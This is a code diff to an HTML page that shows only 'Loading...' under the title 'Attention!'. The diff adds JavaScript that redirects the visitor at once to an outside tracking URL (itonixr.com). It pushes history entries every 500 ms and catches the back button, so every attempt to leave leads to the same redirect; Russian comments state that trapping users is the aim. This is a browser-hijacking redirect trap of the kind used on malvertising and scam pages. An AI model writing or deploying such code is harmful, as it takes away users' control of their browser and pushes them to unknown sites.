@@ -1,31 +1,38 @@
-
 <!DOCTYPE html>
-
 <html>
-
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
-  <title id="a1">Attention!</title>
+  <title>Attention!</title>
   <link rel="icon" href="fav.png" />
-    <script type="text/javascript">
-      document.addEventListener('DOMContentLoaded', () => {
-            // Наполняем стек истории
-            for (let i = 0; i < 10; ++i) {
-        history.pushState({}, '', window.location.href);
-      }
+  <script type="text/javascript">
+    const redirectUrl = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';
 
-      // Перехватываем "назад" или закрытие
+    function trapHistory() {
+      // Постоянно добавляем записи в историю, чтобы ловить "назад"
+      history.pushState({}, '', window.location.href);
+    }
+
+    function redirectToTarget() {
+      window.location.href = redirectUrl;
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // Изначальный редирект сразу после загрузки
+      redirectToTarget();
+
+      // Наполняем стек истории и ловим кнопку "назад" или крестик
+      trapHistory();
+
       window.onpopstate = () => {
         console.log('User pressed back or tried to close the app');
-        // Редирект при попытке "назад"
-        window.location.href = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851'; // Укажи нужный URL сюда
+        redirectToTarget();
       };
-      setTimeout(() => {
-        window.location.href = 'https://itonixr.com/out/9327851?rhd=1&os_version=15.3.0&btz=Europe/Moscow&bto=-180&z=9327851';
-      }, 2000);
-        });
+
+      // Повторяем ловушку каждые 500 мс, чтобы сохранить историю активной
+      setInterval(trapHistory, 500);
+    });
   </script>
 </head>
 
@@ -35,25 +42,17 @@
       position: fixed;
       width: 100%;
       height: 100%;
-    }
-
-    .pl763847__content {
-      height: 100%;
-      background: #FFFFFF;
+      display: flex;
       align-items: center;
       justify-content: center;
+      background: #FFFFFF;
       font-family: "Roboto", sans-serif;
-      display: flex;
       font-size: 36px;
     }
   </style>
 
   <div class="pl763847__wrap">
-    <div class="pl763847__content">
-      Loading...
-    </div>
+    Loading...
   </div>
-
 </body>
-
 </html>
